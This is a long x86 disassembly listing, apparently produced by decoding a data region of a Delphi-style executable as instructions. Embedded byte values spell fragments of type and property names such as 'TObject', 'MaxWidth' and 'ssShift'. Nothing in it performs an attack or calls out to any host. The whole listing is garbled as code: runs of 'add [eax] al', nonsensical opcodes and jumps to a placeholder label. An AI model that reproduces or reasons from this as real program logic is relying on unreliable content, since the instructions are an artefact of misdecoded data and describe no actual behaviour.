or al 0x54
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
insb
je r-xdata
xor dh bl
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
inc ebx
add [ eax + 0x780043de ] al
xor al 0x40
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ebx * 2 - 0x4d ] si
inc ebx
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp - 0x4d ] si
inc ebx
add [ ecx + edx + 0x40 ] bl
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
nop
push 0x10043b2
pop es
push esp
inc ebx
jne r-xdata
inc eax
add [ ebx + esi * 4 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax + eax ] dh
add [ eax ] al
or [ ecx ] dl
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax - 0x7fffbc22 ] dl
fiadd [ ebx ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
mov bl 0x43
jae r-xdata
add [ eax + 0x400043b4 ] bh
inc esp
jb r-xdata
add [ eax ] dh
fiadd [ ebx ]
outsd
insb
jae r-xdata
inc ebx
add [ ebx ] cl
push esp
inc esp
jb r-xdata
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4d ] cl
inc ebx
jb r-xdata
inc ebx
add al dh
fiadd [ ebx ]
mov al [ 0x120043de ]
inc eax
add [ eax ] al
add [ ebx + esi * 4 + 0x43 ] bh
add [ esp + esi + 0x40 ] ah
add [ eax - 0x7fffbc22 ] dl
add [ eax ] al
mov eax 0x400043b4
inc ebx
outsd
outsb
je r-xdata
add [ ebx + 0x43b3c8c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
mov bl 0x43
add [ eax + eax ] bh
add [ eax ] al
fdiv [ edx + 0x34640043 ]
inc eax
add [ eax - 0x7fffbc22 ] dl
fiadd [ ebx ]
js r-xdata
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
xor [ edx + 0x6030043 ] 0x54
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add [ edx + esi * 4 + 0x43 ] bh
add [ esi ] al
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
inc ebx
add [ eax - 0x21 ] ch
inc ebx
add [ ebx * 8 - 0x213bffbd ] cl
inc ebx
add al dl
fadd [ ebx ]
je r-xdata
inc ebx
outsd
outsb
je r-xdata
inc eax
add [ edi + ebx * 8 ] bl
inc ebx
add [ eax - 0x21 ] dl
xor [ eax ] eax
or al 0x32
inc ebx
add [ eax ] ch
fiadd [ ebx ]
xchg esp eax
fild [ ebx ]
fiadd [ ebx ]
js r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x10 ] si
mov ah 0x43
add [ edi ] al
push ss
push esp
inc edx
popad
jae r-xdata
inc ebx
add al dh
fiadd [ ebx ]
mov al [ 0x160043de ]
push esp
inc edx
popad
jae r-xdata
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ edi + ebx * 8 ] bl
inc ebx
add [ esi + ebx * 8 ] cl
inc ebx
add [ eax ] cl
fiadd [ ebx ]
or al 0xdd
inc ebx
add ah al
fiadd [ ebx ]
rcr ah 0x1
inc ebx
add [ esi + ebx * 8 ] ah
inc ebx
add [ eax ] ch
fiadd [ ebx ]
xor dh bl
inc eax
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
xor [ eax ] eax
or al 0x32
inc ebx
add [ eax ] ch
fiadd [ ebx ]
xchg esp eax
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x18 ] si
mov ch 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 4 + 0x43 ] al
add [ eax ] al
add [ eax ] al
inc eax
mov ah 0x43
add [ esp + esi + 0x40 ] ah
add [ eax - 0x4bffbc22 ] dl
fild [ ebx ]
js r-xdata
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
insb
xor al 0x40
inc esp
jb r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
inc eax
add al cl
fadd [ ebx ]
or al 0xde
inc ebx
add [ eax ] cl
fiadd [ ebx ]
or al 0xdd
inc ebx
add [ eax - 0x24 ] dh
inc ebx
add al dl
fadd [ ebx ]
xor [ eax ] eax
or al 0x32
outsd
insd
inc ebx
add al dh
fiadd [ ebx ]
mov al [ 0x140043de ]
push esp
inc esp
jb r-xdata
inc eax
add [ edi + ebx * 8 ] bl
inc ebx
add [ eax - 0x21 ] dl
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
add [ esp + esi + 0x40 ] ch
inc ebx
outsd
outsb
je r-xdata
and al 0xde
je r-xdata
inc ebx
add [ ecx - 0x21f7ffbd ] dl
inc ebx
add [ ebx * 8 - 0x1fb3ffbd ] cl
inc ebx
add al dl
fadd [ ebx ]
and al 0xde
inc ebx
add [ eax ] ch
fiadd [ ebx ]
xor dh bl
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ eax - 0x21 ] ch
inc ebx
add [ ebx * 8 - 0x213bffbd ] cl
inc ebx
add al dl
fadd [ ebx ]
je r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx * 8 - 0x4d ] si
inc ebx
add [ ebx + esi * 4 + 0x43 ] dl
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ eax ] ch
fiadd [ ebx ]
inc ebx
add [ esi + ebx * 8 ] ah
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
fiadd [ ebx ]
sub dh bl
inc ebx
add [ eax ] dh
fiadd [ ebx ]
test al 0xe0
inc ebx
add [ eax - 0xfffbc21 ] bh
loopne r-xdata
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
test al 0xb5
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
mov ch 0x43
add [ eax ] dh
add [ eax ] al
jl r-xdata
push esp
inc esp
jb r-xdata
inc ebx
add [ edi + ebx * 8 - 0x210fffbd ] dl
inc ebx
add [ eax + 0x120043de ] ah
outsd
insb
jae r-xdata
insb
jae r-xdata
add [ ecx + 0x43 ] ch
add [ eax - 0x5fffbc1f ] al
loope r-xdata
fild [ ebx ]
inc ebx
add [ esp + esi + 0x40 ] ah
add [ eax - 0x7fffbc22 ] dl
fiadd [ ebx ]
js r-xdata
add [ ebp - 0x4b73ffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x43b66cc0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x700043b6 ] ch
add [ eax ] al
add [ ebp + esi * 4 + 0x43 ] bl
add [ esp + esi + 0x40 ] ah
add [ eax - 0x57ffbc22 ] dl
loope r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0xb6
inc ebx
add [ eax ] dh
add [ eax ] al
pop esp
mov ch 0x43
add [ edi ] cl
push esp
inc esp
jb r-xdata
inc ebx
add [ eax - 0x47ffbc20 ] ch
fild [ ebx ]
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax ] bl
inc ebx
add [ edi + ebx * 8 ] bl
inc ebx
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax ] bl
inc ebx
add [ edi + ebx * 8 ] bl
inc ebx
add [ ecx - 0x21f7ffbd ] dl
inc ebx
add [ ebx * 8 - 0x1fb3ffbd ] cl
inc ebx
add al dl
fadd [ ebx ]
and al 0xde
inc ebx
add [ eax ] ch
fiadd [ ebx ]
xor dh bl
inc ebx
add [ eax - 0x47ffbc20 ] ch
fild [ ebx ]
inc ebx
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + edi * 8 - 0x4b ] si
inc ebx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + ebp * 4 - 0x4b ] si
inc ebx
add [ esp + esi * 4 ] cl
inc ebx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc eax
add [ ecx ] dl
push esp
inc esp
jb r-xdata
add [ eax ] dh
fiadd [ ebx ]
test al 0xe0
inc ebx
add [ eax - 0xfffbc21 ] bh
loopne r-xdata
outsd
xor al 0x40
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
inc ecx
add [ eax - 0x59 ] al
inc ecx
add [ eax ] ch
aas
inc edx
add [ edi + edi ] dl
inc edx
add [ ebx + esi * 8 + 0x540e0043 ] ah
inc ebx
outsd
outsb
je r-xdata
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax - 0xd ] bh
inc ebx
add [ eax + ebp * 4 ] ah
inc ecx
add [ eax + ebp * 4 ] ch
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
or [ edi + 0x43 ] dh
add [ eax + eax ] ah
add al ch
sbb [ edx ] al
xor al 0x40
inc ebx
add [ ecx + 0x43 ] ch
add [ eax - 0x5fffbc1f ] al
loope r-xdata
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax - 0x17ffbdfd ] bl
cmc
inc ebx
add ah cl
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xb7
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
mov bh 0x43
add [ eax ] al
xor al 0xb7
inc ebx
add [ edi ] al
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ eax ] al
add al 0x42
add [ eax + edi * 8 + 0x3500043 ] dh
inc edx
add ah ah
add eax [ edx ]
cmp [ edx + eax * 2 ] al
inc edx
add [ eax ] cl
clc
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add eax [ edx ]
or al bh
cwde
add eax [ edx ]
call 0xffffffffcc43fba2
jae r-xdata
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
mov bh 0x43
add [ ecx + ebx + 0x42 ] dl
add [ eax + eax ] al
or [ ebx + 0x6f ] al
add ah dh
test [ ebx ] 0x8c
into
inc esp
add [ eax - 0x9 ] ch
inc ebx
add [ esi + ecx * 8 - 0x3137ffbc ] dh
inc esp
add al ah
clc
inc ebx
add [ edi + esi * 8 - 0x30fbffbd ] bl
inc esp
add [ eax ] bl
iretd
inc edx
outsd
insb
jae r-xdata
add [ ebp - 0x4857ffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 4 ] ah
inc ebx
add [ eax + eax ] bl
add [ eax ] al
movsb [ edi ] [ esi ]
mov [ eax + eax + 0x64 ] 0x70004034
xor al 0x40
sub_43ba36
inc ebx
add [ eax ] dl
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
dec ebp
popad
js r-xdata
popad
imul ebp [ esi + 0x74 ] r-xdata
push eax
mov edx 0x10070043
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
dec eax
cmc
inc ebx
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
popad
imul ebp [ esi + 0x74 ] 0x43ba2473
add [ eax + 0x400417f ] bh
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
mov eax 0xc0043b9
add [ eax ] al
dec [ eax - 0xb ]
mov ecx 0x140043
add bh bh
dec eax
cmc
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
lea eax [ eax ]
or al 0xbb
inc ebx
add [ eax ] cl
or edx [ ebp + ecx * 2 + 0x6f ]
inc ebx
outsd
insb
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
outsb
je r-xdata
add [ eax ] cl
add [ eax ] al
dec [ eax - 0xb ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
js r-xdata
add [ eax + 0x80043b9 ] bh
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ eax + eax ] dl
imul esp [ edi + 0x68 ] 0x43b9b874
inc ebx
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul esp [ gs : edi + 0x68 ] 0x43b9b874
add [ eax + eax ] cl
add bh bh
dec eax
cmc
add [ ecx + edx + 0x40 ] bl
add [ eax + 0x2c004010 ] al
js r-xdata
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
add [ esi ] al
inc edx
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
add [ eax ] cl
push cs
push esp
add [ eax + r-xdata ] dl
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
outsb
add [ ecx + edx + 0x40 ] bl
add [ ecx + edx + 0x40 ] bl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edi * 4 + 0x10000043 ] dh
inc eax
add [ eax + r-xdata ] dl
or [ esi ] cl
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
je r-xdata
inc esp
jb r-xdata
push esp
inc esp
jb r-xdata
pop esp
adc [ eax ] eax
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push ebx
push 0xb746669
push esp
push 0x53746669
je r-xdata
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
add [ ecx ] al
push esp
push ebx
popad
je r-xdata
inc edx
jne r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
push esp
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
pop eax
mov ebp 0xf080043
push esp
push ebx
je r-xdata
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov ah 0xb8
inc ebx
add [ eax ] al
adc [ eax ] al
nop
clc
mov esp 0xe080043
outsb
je r-xdata
adc [ eax ] 0x40
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
or [ esi ] al
outsb
je r-xdata
jb r-xdata
add [ ebx + esi * 4 + 0x43 ] dl
jb r-xdata
je r-xdata
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
add [ eax + 0x80043bd ] ah
or eax 0x646e4554
inc esp
pop esp
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
push esp
adc [ eax ] al
push esp
adc [ eax ] al
cld
mov ebp 0xe080043
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
adc [ eax ] eax
push esp
mov bl 0x43
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5c ] si
pop es
dec ecx
outsb
je r-xdata
inc esp
push ebx
outsb
add al 0x8
push es
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
push esp
dec ebx
jns r-xdata
inc ebx
add [ eax ] cl
push cs
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
push esp
or [ esi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
pop esp
adc [ eax ] eax
hlt
pop esp
adc [ eax ] eax
pop esp
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
push esp
inc ebp
outsb
jb r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
pop esp
adc [ eax ] eax
sub al 0x78
inc ecx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x4417ffc0 ] cl
inc ebx
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
add [ ecx + edx + 0x40 ] bl
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
jo r-xdata
inc ebx
push 0x5c007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp - 0x438fffc0 ] cl
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
pop esp
adc [ eax ] eax
pop esp
or [ esi ] cl
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ eax + edi * 2 ] ch
inc ecx
inc ebx
or [ esp + edx * 2 ] cl
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
jbe r-xdata
inc ebp
jbe r-xdata
outsb
je r-xdata
je r-xdata
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
push 0x65
popad
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
pop esp
adc [ eax ] eax
hlt
outsb
je r-xdata
push ebx
add ecx [ eax ]
push es
add [ ebx + 0x43bb84c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
pop esp
adc [ eax ] eax
cmp [ eax + 0x782c0043 ] bh
inc ecx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5c ] si
adc [ eax ] eax
hlt
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx + 0x40 ] bl
add [ ebp + eax * 8 + 0x43 ] cl
add [ ecx * 8 + 0x10000043 ] ah
inc eax
add [ eax - 0x41 ] ah
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
ja r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] bl
add ah dh
mov ch 0x43
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edi * 4 + 0x10000043 ] dh
inc eax
add [ eax + r-xdata ] dl
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
cmp cl al
inc ebx
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] bl
add [ ebp + eax * 8 + 0x43 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
cmp al al
inc ebx
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
inc ebx
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x43c1c0c0 ] cl
push edi
push 0x456c6565
jbe r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
add [ eax + edx + 0x40 ] dl
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebx + 0x43c138c0 ] cl
inc eax
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
je r-xdata
push edi
push 0x556c6565
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
rol cl 0x43
outsb
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
push 0x6e490774
je r-xdata
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x3d ] bh
inc ebx
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
jo r-xdata
je r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] bl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
